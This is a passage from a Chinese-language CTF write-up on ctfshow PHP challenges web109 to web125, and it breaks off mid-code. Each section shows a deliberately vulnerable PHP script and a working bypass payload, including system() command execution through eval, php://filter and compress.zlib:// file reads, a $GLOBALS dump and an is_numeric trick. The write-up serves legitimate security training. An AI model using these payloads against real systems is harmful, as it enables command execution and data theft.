href="#web109">¬∂</a>web109</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v1) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáå‰º†ÂÖ•‰∏§‰∏™ÂèÇÊï∞ÔºåÂπ∂‰∏îÈÉΩÈúÄË¶ÅÊúâÂ≠óÊØçÔºåÊàë‰ª¨Áî®phpÂÜÖÁΩÆÁ±ªËÆ©v1‰∏çËøõË°åÊä•ÈîôÔºåv2ÊâßË°åÊàë‰ª¨ÁöÑÂëΩ‰ª§Â∞±Â•Ω‰∫Ü</p><blockquote><p><strong>Exception</strong> Â§ÑÁêÜÁî®‰∫éÂú®ÊåáÂÆöÁöÑÈîôËØØÂèëÁîüÊó∂ÊîπÂèòËÑöÊú¨ÁöÑÊ≠£Â∏∏ÊµÅÁ®ãÔºåÊòØphpÂÜÖÁΩÆÁöÑÂºÇÂ∏∏Â§ÑÁêÜÁ±ª</p><p><strong>ReflectionClass</strong> ÊàñËÄÖ <strong>ReflectionMethod</strong> ÈÉΩ‰∏∫Â∏∏Áî®ÁöÑÂèçÂ∞ÑÁ±ªÔºåÂèØ‰ª•ÁêÜËß£‰∏∫‰∏Ä‰∏™Á±ªÁöÑÊò†Â∞Ñ</p></blockquote><p>ÊâÄ‰ª•payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br><span class="line">ÊàñËÄÖ</span><br><span class="line">?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br><span class="line">ÊàñËÄÖ</span><br><span class="line">?v1&#x3D;ReflectionMethod&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br></pre></td></tr></table></figure><h3 id="web110"><a class="header-anchor" href="#web110">¬∂</a>web110</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ËøôÈáåÊ≠£ÂàôËøõË°å‰∫ÜÂåπÈÖçÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®FilesystemIteratorÊñá‰ª∂Á≥ªÁªüËø≠‰ª£Âô®Êù•ËøõË°åÂà©Áî®ÔºåÈÄöËøáÊñ∞Âª∫FilesystemIteratorÔºå‰ΩøÁî®getcwd()Êù•ÊòæÁ§∫ÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂ÁªìÊûÑÔºåpayload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web110/DWS8H%40%7BSFV080HL%7D%7BXVH%7B%40X.png" alt=""><br>ÂèëÁé∞Êúâfl36dga.txtÔºåÊé•ÁùÄÂÜçËÆøÈóÆÂç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web110/JFTZOQUY53BT7M9VEUP%5B%403O.png" alt=""></p><h3 id="web111"><a class="header-anchor" href="#web111">¬∂</a>web111</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;$v1,&amp;$v2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°‰æùÁÑ∂ËÄÉÁÇπÂú®‰∫éÂèòÈáèË¶ÜÁõñ(Áü•ËØÜÁÇπÂøòËÆ∞ÁöÑËØùÂéªÊ∏©‰π†‰∏Ä‰∏ãweb105)ÔºåÈ¶ñÈÄâÈúÄË¶Å<code>v1</code>Âê´ÊúâctfshowÊâçËÉΩËøáÊ≠£ÂàôÔºåÊâßË°ågetflagÂáΩÊï∞ÔºåÊâÄ‰ª•<code>v1=ctfshow</code>ÔºåÊé•ÁùÄÂÜçgetflagÂáΩÊï∞ÈáåÔºå‰ºöÊääv2ÁöÑÂú∞ÂùÄ‰º†Áªôv1ÔºåÊé•ÁùÄÂÜçËæìÂá∫v1ÔºåËøôÈáåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®phpÈáåÁöÑÂÖ®Â±ÄÂèòÈáèGLOBALS</p><blockquote><p>$GLOBALS ‚Äî ÂºïÁî®ÂÖ®Â±Ä‰ΩúÁî®Âüü‰∏≠ÂèØÁî®ÁöÑÂÖ®ÈÉ®ÂèòÈáè ‰∏Ä‰∏™ÂåÖÂê´‰∫ÜÂÖ®ÈÉ®ÂèòÈáèÁöÑÂÖ®Â±ÄÁªÑÂêàÊï∞ÁªÑ„ÄÇÂèòÈáèÁöÑÂêçÂ≠óÂ∞±ÊòØÊï∞ÁªÑÁöÑÈîÆ„ÄÇ</p></blockquote><p>ÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</span><br></pre></td></tr></table></figure><p>ËøáÁ®ãÂ∞±ÊòØ<code>$ctfshow=&amp;$GLOBALS</code>(ÂÖ®Â±ÄÂèòÈáè‰∏≠‰ºöÂê´ÊúâflagÁöÑÂèòÈáè)ÔºåÊé•ÁùÄÂÜçÈÄöËøávar_dumpËæìÂá∫$ctfshow</p><h3 id="web112"><a class="header-anchor" href="#web112">¬∂</a>web112</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>È¶ñÂÖà‰∫ÜËß£Âá†‰∏™ÂáΩÊï∞</p><blockquote><p><strong>is_file()</strong> ÂáΩÊï∞Ê£ÄÊü•ÊåáÂÆöÁöÑÊñá‰ª∂ÂêçÊòØÂê¶ÊòØÊ≠£Â∏∏ÁöÑÊñá‰ª∂</p><p><strong>filter()</strong> ÂáΩÊï∞Áî®‰∫éÂØπÊù•Ëá™ÈùûÂÆâÂÖ®Êù•Ê∫êÁöÑÊï∞ÊçÆÔºàÊØîÂ¶ÇÁî®Êà∑ËæìÂÖ•ÔºâËøõË°åÈ™åËØÅÂíåËøáÊª§</p></blockquote><p>ËøôÈáåÈ¶ñÂÖàifËØ≠Âè•ÈáåÈúÄË¶ÅÊàë‰ª¨‰º†ÂÖ•ÁöÑ‰∏çÊòØÊñá‰ª∂Á±ªÂûãÊâçËÉΩÊâßË°åhighlight_fileËØ≠Âè•Êù•ËØªÂèñflagÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØ‰∏Ä‰∏™ÁªïËøáÁöÑËÄÉÁÇπÔºåÊàë‰ª¨‰ΩøÁî®php‰º™ÂçèËÆÆÂç≥ÂèØÔºåÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web113"><a class="header-anchor" href="#web113">¬∂</a>web113</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Âú®‰∏ä‰∏ÄÈ¢òÂü∫Á°Ä‰∏äËøáÊª§‰∫ÜfilterÔºåÈÇ£Êàë‰ª¨Êç¢Âè¶‰∏Ä‰∏™ÂçèËÆÆÔºå‰ΩøÁî®ÂéãÁº©ÊµÅzlib://<br>ÂÆòÊñπphpÊñáÊ°£Âú∞ÂùÄÔºö<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a><br>ÊâÄ‰ª•paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</span><br></pre></td></tr></table></figure><h3 id="web114"><a class="header-anchor" href="#web114">¬∂</a>web114</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Â∏àÂÇÖ‰ª¨Â±ÖÁÑ∂tqlÈÉΩÊòØÈùûÈ¢ÑÊúü ÂìºÔºÅ&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊääcompressËøáÊª§‰∫ÜÔºå‰ΩÜÊ≤°ËøáÊª§filterÔºåÂíåweb112‰∏ÄÊ†∑ÁöÑÂÅöÊ≥ïÔºåpaylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web115"><a class="header-anchor" href="#web115">¬∂</a>web115</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$num</span>)</span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÁî®‰∫Üis_numericÊù•Âà§Êñ≠ÊòØ‰∏çÊòØÊï∞Â≠óÔºåÂπ∂‰∏îifÊù°‰ª∂ÈáåËßÑÂÆötrim($num)ÁßªÈô§Â≠óÁ¨¶‰∏≤‰∏§‰æßÁöÑÂ≠óÁ¨¶‰∏çËÉΩÁ≠â‰∫é36Ôºå‰ΩÜÂêéÈù¢ÁöÑifÈúÄË¶ÅÁ≠â‰∫é36ÊâçËÉΩËæìÂá∫flagÔºåËÄå‰∏îËá™ÂÆö‰πâÂáΩÊï∞filter‰πüÊää16ËøõÂà∂Âíå8ËøõÂà∂Á≠âÁ≠âÂ∞ÅÊ≠ª‰∫ÜÔºåÊàë‰ª¨ÂÜô‰∏™ËÑöÊú¨ÁúãÁúãÊúâ‰ªÄ‰πàÂ≠óÁ¨¶ÂèØ‰ª•Âà©Áî®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">128</span>; $i++) &#123;</span><br><span class="line">    $a = chr($i) . <span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (trim($a) !== <span class="string">&#x27;36&#x27;</span> &amp;&amp; is_numeric($a)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr($i)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂèëÁé∞<code>%0C</code>Ôºå‰πüÂ∞±ÊòØ<code>\f</code>ÂàÜÈ°µÁ¨¶ÂèØ‰ª•Âà©Áî®Ôºå‰∏ç‰ºöË¢´trimËøáÊª§ÊéâÔºåÊâÄ‰ª•paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;%0c36</span><br></pre></td></tr></table></figure><h3 id="web123"><a class="header-anchor" href="#web123">¬∂</a>web123</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ÁúãÂà∞ÂêéÈù¢Êúâ‰∏™eval()ÂáΩÊï∞‰ºöÊâßË°å<code>$c</code>ÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±ÂÖ≥Ê≥®$cÂíåifÂà§Êñ≠ÈúÄË¶ÅÁöÑ‰∏§‰∏™postÂç≥ÂèØ<br>Âú®php‰∏≠ÂèòÈáèÂêçÂè™ÊúâÊï∞Â≠óÂ≠óÊØç‰∏ãÂàíÁ∫øÔºåË¢´getÊàñËÄÖpost‰º†ÂÖ•ÁöÑÂèòÈáèÂêçÔºåÂ¶ÇÊûúÂê´Êúâ<code>Á©∫Ê†º„ÄÅ+„ÄÅ[</code>Âàô‰ºöË¢´ËΩ¨Âåñ‰∏∫<code>_</code>ÔºåÊâÄ‰ª•ÊåâÁêÜÊù•ËØ¥Êàë‰ª¨ÊûÑÈÄ†‰∏çÂá∫<code>CTF_SHOW.COM</code>Ëøô‰∏™ÂèòÈáè(Âõ†‰∏∫Âê´Êúâ<code>.</code>)Ôºå‰ΩÜphp‰∏≠Êúâ‰∏™ÁâπÊÄßÂ∞±ÊòØÂ¶ÇÊûú‰º†ÂÖ•<code>[</code>ÔºåÂÆÉË¢´ËΩ¨Âåñ‰∏∫<code>_</code>‰πãÂêéÔºåÂêéÈù¢ÁöÑÂ≠óÁ¨¶Â∞±‰ºöË¢´‰øùÁïô‰∏ãÊù•‰∏ç‰ºöË¢´ÊõøÊç¢ÔºåÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postÔºö</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag</span><br></pre></td></tr></table></figure><h3 id="web125"><a class="header-anchor" href="#web125">¬∂</a>web125</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span 